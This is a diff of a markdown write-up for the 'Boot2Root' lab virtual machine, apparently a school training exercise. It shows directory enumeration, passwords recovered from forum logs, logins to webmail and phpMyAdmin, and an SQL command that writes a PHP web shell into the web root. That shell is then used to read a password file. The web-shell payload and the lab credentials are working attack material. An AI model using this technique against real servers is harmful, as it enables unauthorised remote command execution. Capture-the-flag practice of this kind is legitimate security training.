@@ -176,7 +176,7 @@ $gobuster dir -u https://192.168.56.101//phpmyadmin -w /usr/share/wordlists/dirb
 
 ```
 
-Resume : We have a lot of interresting pages :
+Resume: We have a lot of interresting pages :
 
 | **SERVICE NAME** | **PAGE NAME** | **VERSION**    |
 |------------------|---------------|----------------|
@@ -186,10 +186,12 @@ Resume : We have a lot of interresting pages :
 | MySQL            | NONE          | 2.3 ?          |
 
 
+<!-- root@mail.borntosec.net
+avec openssl -connect -->
+
+On the page `https://192.168.56.101/forum/index.php?id=6` we have a lot a log. We can see this: 
 
 ```bash
-root@mail.borntosec.net
-
 Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
 
 Oct 5 15:52:11 BornToSecHackMe sshd[28337]: Accepted password for admin from 62.210.32.157 port 60970 ssh2
@@ -197,20 +199,52 @@ Oct 5 15:52:11 BornToSecHackMe sshd[28337]: Accepted password for admin from 62.
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
 ```
 
+The last input is weird, we can suppose it's a password. So we have tried to connect us at the forum with the login `lmezard` and the password `!q\]Ej?*5K5cy*AJ`.  
+It's working !  
+
+Now we can inspect user page. We have an email `laurie@borntosec.net`.  
+We can try to connect us at the `webmail` page.  
+It's working !
+
+```bash
 Squirrel:
 id: laurie@borntosec.net
 pw: !q\]Ej?*5K5cy*AJ
+```
 
+We can inspect mail. There are 2 mails. `DB Access` and `Very interesting !!!!`.  
+With the first mail we have identifiant to DB access. We can try it.  
+It's working ! 
+
+```bash 
 Phpmyadmin:
 id: root
 pw: Fg-'kKXBj87E:aJ$
+```
 
+We can inspect it.  
+We have a `forum_db` database with various table like `mlf2_userdata`.  
+To have access of admin account, we have tried to change admin password by `laurie password` but it's not working.  
+On the user's table we can find `pwf-code`.  
+The second is a mail talking about Windev. Maybe it's related.  
+
+```bash
+pwf-code = e0f5084cfdd90f01ed10a3edf5f10b2a210b6caa6750c50627
+```
+
+On `sent mail` we have find a new email address:
+
+```bash
 ft_root@mail.borntosec.net
+```
 
-pwd_code : e0f5084cfdd90f01ed10a3edf5f10b2a210b6caa6750c50627
+Because of the default configuration of phpmyadmin gives the user full access of mysql command we can create a [back door](https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2) to the server itself.  
+We can use this command in our phpmyadmin:  
 
-
+```sql
 select '<?php system($_GET["cmd"]); ?>' into outfile "/var/www/forum/templates_c/cmd.php";
+```
+
 
 ssh:
 id: lmezard
@@ -259,3 +293,6 @@ cmd=ls -la /home/LOOKATME
 total 1 drwxr-x--- 2 www-data www-data 31 Oct 8 2015 .
 drwxrwx--x 1 www-data root 60 Oct 13 2015 ..
 -rwxr-x--- 1 www-data www-data 25 Oct 8 2015 password 
+
+cmd=cat /home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF" 
